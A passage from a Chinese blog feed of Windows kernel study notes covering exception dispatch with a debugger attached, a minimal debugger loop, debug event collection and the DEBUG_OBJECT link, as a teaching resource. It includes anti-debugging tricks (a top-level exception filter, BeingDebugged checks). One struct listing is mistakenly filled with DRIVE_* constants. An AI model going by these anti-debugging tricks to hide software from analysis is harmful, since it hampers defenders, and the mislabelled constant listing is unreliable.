获取线程上下文环境，调用Windows提供的API GetThreadContext获取，获得到线程上下文环境后，就可以获取到当前状态下各个寄存器的值，在用户APC执行过程一篇中有分析到。 接下来需要修复EIP，原因是对于不同类型的断点，断下后EIP的位置会有所不同，对于软件断点INT3，断下后EIP会位于原先地址+1字节的位置，因此这里需要将EIP-1，修复EIP。 显示反汇编，对于常规调试器，要能够实时看到程序的反汇编代码，所以断下后，至少要能够显示断点周围的反汇编代码，这个功能后面看情况决定是否加上。 等待用户命令，调试器最主要的一个特征就是对代码进行调试，包括但不限于单步，步进，执行等操作。这里通过while循环等待用户执行的命令，若用户未执行命令，就一直等下去。这里参考了KiDispatchException在调用完DbgkForwardException后也会等待处理结果，通过al的值判断异常是否得到了处理，若未被处理则会分发给VEH或SEH去处理。而我们这里调试器就会一直等待WaitUserForCommand传回来的结果，该函数将手动实现，后面涉及到单步操作时会学习到。 参考资料参考文档： 张嘉杰笔记 My classmates笔记 参考教程： 海哥逆向中级预习班课程","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"调试与异常","slug":"调试与异常","date":"2020-09-16T11:42:04.000Z","updated":"2022-05-17T15:36:32.499Z","comments":true,"path":"2020/09/16/调试与异常/","link":"","permalink":"http://cata1oc.github.io/2020/09/16/%E8%B0%83%E8%AF%95%E4%B8%8E%E5%BC%82%E5%B8%B8/","excerpt":"","text":"前言通过前几篇对调试的学习，现在可以对调试的过程有个整体的认识，本篇介绍调试与异常之间的关系，尽管在之前一个篇章中，已经比较详细的概括了异常相关的各个知识点，但是调试本身就相当于给调试器发送一个异常类型的调试事件。这里就再回顾一下。 调试器下的异常分发在之前学习用户异常的分发与内核异常的分发时，由于我们直接分析了KiDispatchException的执行流程，所以我们知道在异常分发时，会先判断调试器是否存在，尽管在当时的实验中并没有加入调试器的实验。本篇就要验证一下有无调试器时，异常分发的流程： 编写运行如下代码：（环境：Windows XP，编译器：VC++6.0） c12345678910111213141516171819#include \"stdafx.h\"int main(int argc, char* argv[]){ int x = 100; int y = 0; int z; _try{ z = x/y; printf(\"无法执行的代码!\\n\"); getchar(); } _except(1){ printf(\"SEH异常处理代码\\n\"); } getchar(); return 0;} 正常情况下，运行结果如下，触发除零异常后，执行_except块中的代码 将其.exe文件用OD打开（创建进程或者附加进程都行），会发现程序会断在这里不动了，无论如何按F9，都无法继续执行。原因是KiDispatchException检测到了调试器的存在，因此会先交予调试器处理。 这时我们根据堆栈可以找到引发除零异常的参数，修改其值，就可以继续执行了 便会出现结果如下，可以看到调试器成功处理了异常，程序会正常执行，便不会继续寻找SEH 当然，也可以让调试器选择不处理，在OD的调试选项中，选择异常，可以忽略选择类型的异常，此时我们把除零异常选上，再次执行时，调试器就不会处理，于是便会分发给SEH去处理，结果如下 最后一道防线与二次分发这一部分已经在未处理异常提过，这里用实验再简单的验证一下： 将刚刚的程序作如下修改： c1_except(1) ----> _except(0) 修改完后，可以看到，在忽略除零异常的情况下，还是会断在这里，这是因为在第一次分发时调试器没有处理，SEH也没有处理，最后一道防线检测到此时存在调试器，于是又发送了一次异常调试事件给调试器，即第二轮分发。如果这次还不处理，那么便会终止进程。 若没有被调试，则会查询是否通过SetUnhandledExceptionFilter注册顶层处理函数： 如果有就调用。 如果没有，就弹出窗口，让用户选择终止进程还是启动即时调试器。 实验结果如下，在不附加到调试器的情况下，在文件夹直接打开.exe文件，就可以看到未注册顶层处理函数的情况，只是此处没有选择启动即使调试器的选项。 反调试与反反调试原理已经在未处理异常一篇中说明过了，利用的顶层处理函数的机制，只是当时没能成功运行程序，这次可以了，并且是一个新的例子。 编写运行如下代码：（环境：Windows XP，编译器：VC++6.0） c1234567891011121314151617181920212223242526272829#include \"stdafx.h\"#include \"windows.h\"long _stdcall callback(_EXCEPTION_POINTERS* excp){ excp->ContextRecord->Ecx = 1; return EXCEPTION_CONTINUE_EXECUTION;}int main(int argc, char* argv[]){ //注册一个最顶层异常处理函数 SetUnhandledExceptionFilter(callback); //除0异常 _asm { xor edx,edx xor ecx,ecx mov eax,0x10 idiv ecx } //程序正常执行 printf(\"程序执行\"); getchar(); return 0;} 由于异常会被注册的顶层函数（存储在kernel32!BaseCurrentTopLevelFilter的全局变量中）处理掉。因此程序是可以正常执行的（注意要从项目的文件夹中打开程序，不要直接在VC++6.0中运行） 如果把程序拖进调试器，情况就不一样了，由于检测到了调试器的存在，在第一次遇到异常时，会先交给调试器处理。 如果调试器选择忽略此类异常，由于NtQueryInformationProcess检测到了程序正在被调试，因此不会调用注册的顶层处理函数，所以程序无法得到修复。本程序比较简单，或许可以在调试器中手动修复程序，若是较为复杂的逻辑，修复起来就变得困难了。 除了上面这种利用顶层处理函数的机制进行反调试的手段，还有一种，也是比较常规的，就是进程不断的给调试器发送异常调试事件，调试器也无法区分哪个调试事件是有用的，会一并接收，从而达到反调试的目的。 总结总结就一张包含了调试器的异常处理的图。 参考资料参考笔记： 张嘉杰笔记 参考教程： 海哥中级逆向课程-异常的处理流程","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"调试事件的处理","slug":"调试事件的处理","date":"2020-09-14T05:33:23.000Z","updated":"2022-05-17T15:35:48.762Z","comments":true,"path":"2020/09/14/调试事件的处理/","link":"","permalink":"http://cata1oc.github.io/2020/09/14/%E8%B0%83%E8%AF%95%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%A4%84%E7%90%86/","excerpt":"","text":"前言前面两篇学习了调试器进程与被调试进程如何通过调试对象建立起联系，也了解了调试事件等概念，总结为下图： 本篇将通过程序模拟两种建立调试关系的方式，分析调试事件的处理过程及不同调试事件的结构细节。 建立调试关系（创建进程）模拟程序代码首先，我们要模拟一个调试关系建立的过程，参考如下代码： c1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include \"stdafx.h\"#include \"windows.h\"#define dbgProcessName \"C:\\\\Dbgview.exe\"int main(){ BOOL nIsConinue = TRUE; DEBUG_EVENT debugEvent = {0}; //1.创建调试进程 STARTUPINFO startupInfo = {0}; PROCESS_INFORMATION pInfo = {0}; GetStartupInfo(&startupInfo); //以Create方式创建调试链接 BOOL bRet = CreateProcess(dbgProcessName, NULL, NULL, NULL, TRUE, DEBUG_PROCESS||DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &startupInfo, &pInfo); if (bRet == FALSE) { printf(\"CreateProcess error:%d\\n\", GetLastError()); getchar(); return 0; } //2.调试循环 while (nIsConinue) { //取DEBUG_EVENT bRet = WaitForDebugEvent(&debugEvent, INFINITE); if (!bRet) { printf(\"WaitForDebugEvent error:%d\\n\", GetLastError()); return 0; } switch (debugEvent.dwDebugEventCode) { case EXCEPTION_DEBUG_EVENT: //printf(\"异常：发生异常的地址：%X \\n\",debugEvent.u.Exception.ExceptionRecord.ExceptionAddress); printf(\"发生异常调试事件\\n\"); break; case CREATE_THREAD_DEBUG_EVENT: printf(\"创建线程调试事件\\n\"); break; case CREATE_PROCESS_DEBUG_EVENT: printf(\"创建进程调试事件\\n\"); break; case EXIT_THREAD_DEBUG_EVENT: printf(\"退出线程调试事件\\n\"); break; case EXIT_PROCESS_DEBUG_EVENT: printf(\"退出进程调试事件\\n\"); break; case LOAD_DLL_DEBUG_EVENT: printf(\"加载DLL调试事件\\n\"); break; case UNLOAD_DLL_DEBUG_EVENT: printf(\"卸载DLL调试事件\\n\"); break; default: break; } //DBG_CONTINUE 表示调试器已处理该异常 //DBG_EXCEPTION_NOT_HANDLED 表示调试器没有处理该异常，转回到用户态中执行，寻找可以处理该异常的异常处理器 //ContinueDebugEvent 告诉被调试程序让被调试程序继续执行 bRet = ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE); } return 0;} 这个代码基本上可以看作是一个简单的调试器的逻辑代码了，这里面主要分为两个部分：一个是创建调试器与被调试进程的联系，另一个是调试器对调试事件的处理。 创建调试器与被调试器进程的联系，这个原理在第一篇中已经介绍的比较清楚了，这里主要是通过CreateProcess的方式建立联系的，相当于在调试器中打开一个exe程序。这里需要说明的是CreateProcess中DEBUG_ONLY_THIS_PROCESS这个参数，它的作用是在调试过程中若被调试进程创建了新的进程，仍然只调试当前进程。 调试器对调试事件的处理这部分代码逻辑并不复杂，复杂的是不同调试事件的数据结构。在一个While循环中，调用WaitForDebugEvent不断从_DEBUG_OBJECT.EventList中获取调试事件，并根据调试事件类型的不同，进行相应的处理，这里仅将调试事件的类别打印出来。 调试事件结构代码中通过调用WaitForDebugEvent从调试对象的EventList中获取调试事件，而调试事件是由DEBUG_EVENT定义的一个变量，用来接收从EventList中取到的调试事件。下面来看一下DEBUG_EVENT的结构： c12345678910111213141516171819202122232425typedef struct _DEBUG_EVENT { DWORD dwDebugEventCode; //甚么类型的调试事件 DWORD dwProcessId; //触发调试事件的进程ID DWORD dwThreadId; //触发调试事件的线程ID union { EXCEPTION_DEBUG_INFO Exception; //异常类型信息 CREATE_THREAD_DEBUG_INFO CreateThread; //线程创建类型信息 CREATE_PROCESS_DEBUG_INFO CreateProcessInfo; //进程创建类型信息 EXIT_THREAD_DEBUG_INFO ExitThread; //线程退出类型信息 EXIT_PROCESS_DEBUG_INFO ExitProcess; //进程退出类型信息 LOAD_DLL_DEBUG_INFO LoadDll; //模块加载类型信息 UNLOAD_DLL_DEBUG_INFO UnloadDll; //模块卸载类型信息 OUTPUT_DEBUG_STRING_INFO DebugString; RIP_INFO RipInfo; } u;} DEBUG_EVENT, *LPDEBUG_EVENT;//dwDebugEventCode的取值#define DRIVE_UNKNOWN 0#define DRIVE_NO_ROOT_DIR 1#define DRIVE_REMOVABLE 2#define DRIVE_FIXED 3#define DRIVE_REMOTE 4#define DRIVE_CDROM 5#define DRIVE_RAMDISK 6 前三个成员很好理解，调试事件的类型（取值已列出）、触发调试事件的进程ID、触发调试事件的线程ID；紧接着是一个共用体，该值由调试事件的类型决定，每一种类型的调试事件的取值都不同，对应的结构也不同，这也是为什么这些调试事件有这么多的采集函数，因为每种调试事件的结构体不同，所以调试事件采集函数也不同。各类调试事件对应的结构体如下： c1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162//异常类型信息typedef struct _EXCEPTION_DEBUG_INFO { EXCEPTION_RECORD ExceptionRecord; DWORD dwFirstChance;} EXCEPTION_DEBUG_INFO, *LPEXCEPTION_DEBUG_INFO;//线程创建类型信息typedef struct _CREATE_THREAD_DEBUG_INFO { HANDLE hThread; LPVOID lpThreadLocalBase; LPTHREAD_START_ROUTINE lpStartAddress;} CREATE_THREAD_DEBUG_INFO, *LPCREATE_THREAD_DEBUG_INFO;//进程创建类型信息typedef struct _CREATE_PROCESS_DEBUG_INFO { HANDLE hFile; HANDLE hProcess; HANDLE hThread; LPVOID lpBaseOfImage; DWORD dwDebugInfoFileOffset; DWORD nDebugInfoSize; LPVOID lpThreadLocalBase; LPTHREAD_START_ROUTINE lpStartAddress; LPVOID lpImageName; WORD fUnicode;} CREATE_PROCESS_DEBUG_INFO, *LPCREATE_PROCESS_DEBUG_INFO;//线程退出类型信息typedef struct _EXIT_THREAD_DEBUG_INFO { DWORD dwExitCode;} EXIT_THREAD_DEBUG_INFO, *LPEXIT_THREAD_DEBUG_INFO;//进程退出类型信息typedef struct _EXIT_PROCESS_DEBUG_INFO { DWORD dwExitCode;} EXIT_PROCESS_DEBUG_INFO, *LPEXIT_PROCESS_DEBUG_INFO;//模块加载类型信息typedef struct _LOAD_DLL_DEBUG_INFO { HANDLE hFile; LPVOID lpBaseOfDll; DWORD dwDebugInfoFileOffset; DWORD nDebugInfoSize; LPVOID lpImageName; WORD fUnicode;} LOAD_DLL_DEBUG_INFO, *LPLOAD_DLL_DEBUG_INFO;//模块卸载类型信息typedef struct _UNLOAD_DLL_DEBUG_INFO { LPVOID lpBaseOfDll;} UNLOAD_DLL_DEBUG_INFO, *LPUNLOAD_DLL_DEBUG_INFO;typedef struct _OUTPUT_DEBUG_STRING_INFO { LPSTR lpDebugStringData; WORD fUnicode; WORD nDebugStringLength;} OUTPUT_DEBUG_STRING_INFO, *LPOUTPUT_DEBUG_STRING_INFO;typedef struct _RIP_INFO { DWORD dwError; DWORD dwType;} RIP_INFO, *LPRIP_INFO; 额外的异常调试事件前面介绍了代码的主体逻辑，以及不同调试事件对应的结构体，下面就来运行一下程序观察结果。 由图，一开始打开程序时会创建进程，接着加载了一系列程序需要用到的DLL，加载DLL期间会触发一次异常调试事件，最后创建主线程。这个逻辑还是很好理解的，就有一点比较奇怪，为什么会有一个看上去格格不入的异常调试事件？为了弄清这点，我们修改代码，打印异常发生时的地址，可以通过异常调试事件对应的结构体中获取。 发现异常发生的地址为0x7C92120E（不同环境下该值会不一样，本次实验的值为这个），记住这个值。然后，打开OD，以创建进程的方式调试Dbgview.exe，可以看到程序会断在0x413487的位置，进入调试选项，选择事件，会发现此时设置的是程序第一次加载会断在WinMain的位置。 将其改为系统断点，重新操作一次 情况就变得不一样了，可以看到程序断下的位置为0x7C92120F，在它前面一个字节0x7C92120E处刚好有一个INT3，刚好与发生异常的地址一样。现在我们知道，创建被调试进程时，发生的异常调试事件就是在这里的一个断点。但是，为什么会有这么一个突如其来的断点在这呢？这里，我们先来回顾一下进程的创建过程： Code12345678进程的创建过程：1.映射PE文件2.创建内核对象EPROCESS3.映射系统DLL(ntdll.dll,这个DLL比较特殊,在初始化内核时就创建好了)4.创建线程内核对象ETHREAD5.系统启动线程 1)映射DLL(ntdll.LdrInitializeThunk) 2)线程开始启动 这里注意到，在映射文件中引用的DLL时会调用ntdll.dll中的一个函数LdrInitializeThunk，下面打开IDA，跟进分析： LdrInitializeThunk内部会调用LdrpInitialize，LadpInitialize内部又会调用LdrpInitializeProcess（如果是第一个线程），这里的具体跳转就不细看，直接看能证明结论的图。 LdrpInitializeProcess这个函数非常的复杂，这里只看关键部分逻辑。首先令ebx获取到PEB的地址，然后判断PEB+0x2处的值，即BeingDebugged的值是否为0，若不等于0，则跳转并调用函数DbgBreakPoint。进入DbgBreakPoint后发现，这个函数就是下一个INT3断点，只是封装成了函数的形式。 分析完LdrInitializeThunk内部的调用逻辑，这下就可以解释的通为什么会有一个异常调用事件出现。在初始化进程时会通过PEB.BeingDebugged判断当前进程是否正在被调试，若正在被调试，就会为它增加一个INT3断点。 小结这一部分，主要了解了以创建进程的方式建立调试关系时，触发的一些调试事件。并罗列出了各类调试事件对应的结构体。PEB.BeingDebugged作为3环查询是否被调试的字段，与0环的EPROCESS.DebugPort相对应，作为反调试一方要了解这些细节，而反反调试则要洞察这一切可能暴露自己的蛛丝马迹。 建立调试关系（附加进程）与创建进程的不同这部分，以附加进程的方式与被调试进程建立调试关系（相当于OD中attch进程的方式），代码没有太大变化，仅有一点小调整，将CreateProcess替换成DebugActiveProcess。由于GetProcessId这个函数已经用不了了，因此直接去任务管理器找PID的，然后从缓冲区读入的方式作为DebugActiveProcess的参数，具体如下： c12345678//以Attach方式创建调试链接scanf(\"%d\", &PID);if (!DebugActiveProcess(PID)){ printf(\"AttachProcess error:%d\\n\", GetLastError()); getchar(); return 0;} 运行结果如下 光从结果上来看，与CreateProcess的方式没有太大区别。但是，当我们通过CreateProcess时需要创建进程，所以才会有一系列的DLL加载的操作。然而，我们使用Attach方式式，却仍然可以看到DLL加载的操作，这到底是为什么呢？DLL不是应该早已加载好了吗？要解决这个问题，需要进入内核的NtDebugActiveProcess一探究竟。 杜撰的消息进入NtDebugActiveProcess，可以看到，在将被调试进程与调试对象关联起来之前，调用了一个名为DbgkpPostFakeProcessCreateMessages，顾名思义，就是向调试器发一些杜撰出来的假消息。而且此时被调试进程还未和调试对象关联，因此调试器是接收不到任何来自被调试线程的消息的。 进入DbgkpPostFakeProcessCreateMessages后，发现有线程相关的假消息，以及模块相关的假消息，都会被发送给调试器。显然那些通过Attach方式与被调试进程建立调试关系时，看到那些DLL加载的调试事件，实际上是NtDebugActiveProcess发给调试器杜撰出来的假消息。 为什么NtDebugActiveProcess要给调试器发送假的消息呢？调试器可以看到被调试进程加载的DLL，主要是因为每个模块在加载的时候会被调试事件采集函数给截获，并将该类调试事件发送给调试器。而通过Attach的方式会无法看到进程初始化时所加载的DLL，因此该API在执行的过程中加上了这些假消息希望给调试器提供一些必要的信息。不过，这些假消息并不靠谱，这些模块主要依据PEB.Ldr中的三个链表得来的，这三个链表以不同的顺序存着该进程所有加载的模块。 显然，这个地方是很容易被修改的，因此通过Attach方式看到的加载模块往往并不靠谱。 总结 以创建进程的方式建立调试关系时，初始化函数为会进程增加一个INT3断点。 以附加进程的方式建立调试关系时，NtDebugActiveProcess会杜撰假消息发送给调试器。 参考资料参考笔记： 张嘉杰学习笔记 My classmates学习笔记 参考教程： 海哥逆向中级预习班","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"调试事件的采集","slug":"调试事件的采集","date":"2020-09-13T09:17:18.000Z","updated":"2022-05-17T15:35:21.254Z","comments":true,"path":"2020/09/13/调试事件的采集/","link":"","permalink":"http://cata1oc.github.io/2020/09/13/%E8%B0%83%E8%AF%95%E4%BA%8B%E4%BB%B6%E7%9A%84%E9%87%87%E9%9B%86/","excerpt":"","text":"什么是调试事件前一篇在介绍调试对象时，分析了调试器如何通过调试对象与被调试进程建立连接，这同样产生了另一个新的问题，调试器进程如何才能知道被调试进程发生甚么事了？于是就有了调试事件这么一个概念，用来描述被调试进程的某些行为，当被调试进程做出了一些行为后，如果属于调试事件中的一类，就会借助调试对象告知调试器。参考下图： 再来回顾一下调试对象的结构： c123456typedef struct _DEBUG_OBJECT { KEVENT EventsPresent; //+0x00,用于指示有调试事件发生的事件对象 FAST_MUTEX Mutex; //+0x10,用于同步的互斥对象 LIST_ENTRY EventList; //+0x30,保存调试事件的链表 ULONG Flags; //+0x38,标志位,调试消息是否已读取} DEBUG_OBJECT, *PDEBUG_OBJECT; 位于_DEBUG_OBJECT(+0x30)处的成员EventList是一个链表，从被调试进程发送过来的调试事件都会存在这个链表里。 调试事件的种类前面说到调试事件，自然也有一定的边界，不能说执行了什么代码（例如打印了某个字符，申请了一块内存），都产生一个调试事件发送给_DEBUG_OBJECT，那样链表也就过于复杂了，所以调试事件设定了以下7种类型： c123456789101112typedef enum _DBGKM_APINUMBER{ DbgKmExceptionApi = 0, //异常(例：Int3断点，硬件断点) DbgKmCreateThreadApi = 1, //创建线程 DbgKmCreateProcessApi = 2, //创建进程 DbgKmExitThreadApi = 3, //线程退出 DbgKmExitProcessApi = 4, //进程退出 DbgKmLoadDllApi = 5, //加载DLL DbgKmUnloadDllApi = 6, //卸载DLL DbgKmErrorReportApi = 7, //内部错误(已废弃) DbgKmMaxApiNumber = 8, //最大值} DBGKM_APINUMBER; 当被调试进程做出任何一种上述类型的行为时，都会产生调试事件，并发送给_DEBUG_OBJECT.EventList。 调试事件采集函数下面来到本篇的核心部分，前面介绍了什么是调试事件，以及调试事件的种类，那么当被调试进程产生了某些行为后，调试事件是如何被采集并写入到_DEBUG_OBJECT.EventList的呢？这一部分先研究采集的过程，也就是谁会替我们生成调试事件。 Windows系统中提供了一些调试事件的采集函数，它们以Dbgk开头，用于生成不同调试事件对应的结构体，具体如下： 针对不同类型的调试事件，均有对应的调试事件采集函数。图中黑色字体的为导致调试事件产生的函数，紫色字体的为生成调试事件的采集函数，红色字体的则为调试事件写入函数。并且调试事件采集函数均在导致调试事件发生的函数执行的必经之路上，从而捕获到被调试进程的行为。下面以前4类调试事件为例，分析调试事件采集函数的执行过程。 创建进程、线程事件采集首先来看创建进程、线程的事件采集函数，创建进程的本质就是创建线程，其中第一次创建线程时为创建进程。因此底层调用的函数一样，均为PspUserThreadStartup，下面来分析它的执行流程： 进入PspUserThreadStartup，往下翻，就可以很容易找到其内部调用的调试事件采集函数DbgkCreateThread 进入DbgkCreateThread，进来后，可以看到有一个判断，判断当前进程的DebugPort的值是否为空（ebx先前会被清零），这是每个Dbgk系列的函数都会做的判断；如果DebugPort的值不为空，说明当前进程正在被调试，此时会跳转到图中左侧所示的代码继续执行。 左侧部分代码主要做两件事，第一件事，通过判断创建的线程是不是第一个线程来判断此时属于创建进程还是创建线程，第二件事，针对该调试事件将其打包成一个结构体。接着会跳转到右侧下方处的代码执行，并最终调用DbgkpSendApiMessage，这个函数会在文章后半部分进行分析，它的第一个参数，就是刚刚打包的调试事件结构体。 小结：经过分析，可以得出，若一个进程正在被调试，当它调用PspUserThreadStartup创建线程时就会被采集调试事件，并调用DbgkpSendApiMessage。 退出线程、进程事件采集一个例子往往不够说明问题，再进入PspExitThread分析一下： 进入PspExitThread，往下翻，可以看到这里在PspExitThread就已经判断了DebugPort的值，同样是如果不为空就跳转。跳转后，会判断要退出的线程是不是最后一个线程了，如果是就调用DbgkExitProcess，如果不是就调用DbgkExitThread。 参考下图，无论是DbgkExitThread还是DbgkExitProcess，内部都会调用DbgkpSendApiMessage，当然在调用之前，这两个函数都会先生成一个该函数对应的调试事件结构体。 小结：在退出线程或进程的必经之路上会调用DbgkExitThread或者DbgkExitProcess生成相应的调试事件结构体，并最终调用DbgkpSendApiMessage。其余的调试事件采集函数不再作分析，结论相同，可自行分析。 调试事件写入函数经过前文的分析，会发现调试事件采集函数内部会创建一个调试事件结构体，并且最终都会调用DbgkpSendApiMessage，进入IDA，对该函数进行交叉引用，验证结论。 DbgkpSendApiMessage执行流程显然，这个函数就是用来将创建好的调试事件发送到调试对象的事件链表里的，接下来就分析一下这个函数的执行流程： 进入DbgkpSendApiMessage，它调用了一个函数DbgkpQueueMessage，该函数有一个参数Event，这是调试事件采集函数创建的结构体，并且有一个互斥体参数，与调试对象的第一个成员一样，所以从这里进入分析。 进入DbgkpQueueMessage，可以看到，在执行到一半时，会先从自己进程的EPROCESS中拿出调试对象（之前判断不为空，才会执行到这里，因此当前进程一定是正在被调试的进程），并在之后的部分从调试对象中取出EventList成员的首地址，并将ebx保存的节点插入到EventList的第一个位置，可以推测ebx为经过处理后的调试事件。这部分执行完后，调试事件已经被写入到函数中。 再看_DEBUG_OBJECT至此调试事件写入部分结束，我们在回过头看一下调试对象的各个成员，应该能更好理解一些： c123456typedef struct _DEBUG_OBJECT { KEVENT EventsPresent; //+0x00,用于指示有调试事件发生的事件对象 FAST_MUTEX Mutex; //+0x10,用于同步的互斥对象 LIST_ENTRY EventList; //+0x30,保存调试事件的链表 ULONG Flags; //+0x38,标志位,调试消息是否已读取} DEBUG_OBJECT, *PDEBUG_OBJECT; EventsPresent：在调用DbgkpQueueMessage将调试事件添加到链表后，_DEBUG_OBJECT.EventsPresent将会修改状态，然后调试器就会从EventList中把调试事件取出来。 Mutex：调试器从EventList中取调试事件会修改链表，DbgkpSendApiMessage往EventList链表写数据也会改，所以需要有一个Mutex来互斥一下。 Flags：用于标识这个事件调试器有没有读取。 DbgkpSendApiMessage参数说明该函数有两个参数，这里简单说明一下： 参数1：消息结构，每种消息都有自己的消息结构，由不同的调试事件采集函数创建，共有7种类型。 参数2：是否需要把本进程除了自己之外的其它线程挂起，有些调试事件需要把其它线程挂起，比如int3断点；有些调试事件不需要把线程挂起，比如模块加载 小结：DbgkpSendApiMessage是调试事件采集的总入口，如果在这里挂钩子，调试器将无法调试。 参考资料参考教程： 海哥逆向中级预习班 参考链接： https://blog.csdn.net/weixin_42052102/article/details/83627969 （My classmates-调试事件采集笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"调试对象","slug":"调试对象","date":"2020-09-11T01:47:15.000Z","updated":"2022-05-17T15:34:54.873Z","comments":true,"path":"2020/09/11/调试对象/","link":"","permalink":"http://cata1oc.github.io/2020/09/11/%E8%B0%83%E8%AF%95%E5%AF%B9%E8%B1%A1/","excerpt":"","text":"前言本篇开始学习软件调试的基础知识，也是Windows内核基础的最后一个阶段了。软件调试实际上东西不多，若是想开发一个调试器，掌握十几个API就差不多了，但是如果想要在调试与反调试的对抗中占据主动，对细节的了解才是最重要的。 软件调试系列主要用到kernel32.dll、ntdll.dll、ntoskrnl.exe这几个文件，对于一些Windbg未导入的符号表ReactOS也有助于代码的分析。下面进入正文。 调试器与被调试程序媒介调试器是一个进程，被调试程序是一个进程，如何才能将两个进程联系到一起呢？就需要一个媒介，进程间是相互隔离的，但是高2G往往又是相同的，因此这个媒介可以利用内核层来实现。 在接下来的学习中，会一点点接开这个媒介是什么，以及如何创建，使用的。 建立联系的方式打开调试器，有两种与被调试程序建立联系的方式： 在调试器中打开一个程序：这种方式是通过CreateProcess()建立联系的 将一个正在运行的程序附加到调试器中：这种方式是通过DebugActiveProcess()建立联系的 两种建立联系的方式本质上区别并不大，只是第一种有一个创建进程的过程，多出一步，所以仅分析第二种通过DebugActiveProcess()建立联系的方式即可。 DebugActiveProcess执行流程下面开始分析DebugActiveProcess的执行流程，这里要先说明一下，调试是调试器向被调试进程发起的，所以调用DebugActiveProcess的进程就是调试器进程。 关联调试对象与调试器 首先进入kernel32.dll中的DebugActiveProcess，最前面有一个值得关注的函数DbgUiConnectToDbg，进入后发现它调用了另一个dll中的同名函数。 进入ntdll.dll中的DbgUiConnectToDbg，这里分为两个部分来看： 红色方框主要来梳理调用关系，DbgUiConnectToDbg内部调用了ZwCreateDebugObject，顾名思义，这个函数用来创建调试对象_DEBUG_OBJECT（后面简称调试对象），也就是之前提到的媒介，当然，它也只是进入0环的入口函数，具体创建过程在0环。 再看橙色方框，先解释一下fs:[18h]为什么是TEB，我们知道3环的fs:[0]指向TEB，TEB中的第一个成员是NtTib，NtTib中0x18处的成员为Self，指向NtTib的地址，也就是TEB本身，所以fs:[18h]的值，就是TEB。接着令将地址TEB+0xF24作为ZwCreateDebugObject的参数传进去了。有点逆向基础的都知道，eax是保存函数返回值的地方，所以ZwCreateDebugObject的返回值会保存在eax中，也就是TEB+0xF24。由于调试对象是0环的结构体，所以返回的不可能是地址，只能是句柄，因此TEB+0xF24保存的值为调试对象的句柄。 下面为_DEBUG_OBJECT的结构： c123456typedef struct _DEBUG_OBJECT { KEVENT EventsPresent; //+0x00,用于指示有调试事件发生的事件对象 FAST_MUTEX Mutex; //+0x10,用于同步的互斥对象 LIST_ENTRY EventList; //+0x30,保存调试事件的链表 ULONG Flags; //+0x38,标志位} DEBUG_OBJECT, *PDEBUG_OBJECT; 回到kernel32.dll中，当执行到红色方框处时，DbgUiConnectToDbg已经完成了两件事： 创建调试对象_DEBUG_OBJECT（位于0环） 将调试对象与调试器进程关联起来（调试对象句柄位于调试器进程TEB+0xF24处） 关联调试对象与被调试进程前面介绍了调试用的媒介调试对象，是如何与调试器关联起来的，接下来继续分析DebugActiveProcess函数看看被调试进程是如何与调试对象关联的。 这里还是分为2个部分看 红色方框还是调用关系，这里调用的第一个函数ProcessIdToHandle，顾名思义，这个函数的作用是将进程Id转换为进程的句柄，我们分析的DebugActiveProcess只有一个参数就是被调试进程的Id，这里转换的就是被调试进程的Id；转换完后，会调用DbgUiDebugActiveProcess，进入函数内部，显然，具体实现在ntdll.dll中。 橙色方框来看细节，ProcessIdToHandle执行完后将eax中的值又赋给了esi，此时esi存的就是被调试进程的句柄，并且它作为参数传入DbgUiDebugActiveProcess函数中。 进入ntdll.dll中，这部分做了一件事，就是调用NtDebugActiveProcess，跟进后发现，要进内核的，所以放到后面分析。这里关注一下它的两个参数，第一个参数是调试对象的句柄，在分析DebugActiveProcess执行流程的开头提到过，目前执行的是调试器的线程，这里从TEB+0xF24获取到先前创建的调试对象的句柄；第二个参数就是前面经过ProcessIdToHandle转换的被调试进程的句柄。 进入到ntoskrnl.exe中，这部分的代码比较长，逻辑也是比较重要的，所以分为3个部分来看，这里先看第一部分的代码。这里调用了ObReferenceObjectByHandle，这个函数的作用是将句柄转换为地址，由于现在已经进入0环了，句柄就没什么用了，因此需要转换为地址来用。这里最需要注意的就是它的参数，该函数有6个参数，第一个参数是被调试进程的句柄，用于转换成该进程EPROCESS的地址；第五个参数是最重要的，没有逆向基础的人可能很难理解，它是一个OUT类型的参数，存的是被调试进程的句柄的所在地址。在执行完函数后，该地址原先存放的句柄会被替换成进程EPROCESS的地址，并依然存放在这。这种手法在3环API也比较常见，逆多了程序就很容易理解了。 接着来看第二部分： 紫色方框：将被调试进程EPROCESS的地址暂存到esi中。 橙色方框：作两个判断，有两个进程是不能调试的，一个是自己本身的进程，另一个是PsInitialSystemProcess系统初始化进程，若调试的是这两个进程，则跳转离开。 红色方框：调用ObReferenceObjectByHandle将调试对象的句柄转换成调试对象的地址。存在之前那个OUT参数那里，原先存的被调试进程的EPROCESS已经暂存到了esi中。 来看最后一部分，这里将调试对象的地址与被调试进程的EPROCESS作为参数传入，并调用函数DbgkpSetProcessDebugObject 进入DbgkpSetProcessDebugObject，此处仍位于ntoskrnl.exe中，红色方框用来标记出两个重要参数被调试进程EPROCESS的地址与调试对象的地址。橙色方框，先判断被调试进程的DebugPort处的值是否为0，若不为0，说明已经被调试了，就只能跳走。若不为0，说明未被调试，则将调试对象_DEBUG_OBJECT存到被调试进程EPROCESS.DebugPort处。至此，调试对象与被调试进程也关联起来了，调试对象存到了被调试进程EPROCESS.DebugPort处。 _DEBUG_OBJECT的本质：桥通过上面的学习，了解到调试对象_DEBUG_OBJECT的本质就是调试器进程与被调试进程之间的桥梁，它作为媒介，先后与调试器，被调试进程创建联系，从而将两者联系起来。参考下图： 攻防对抗反调试在掌握了调试原理后，自然也就可以总结出一些反调试的手段： 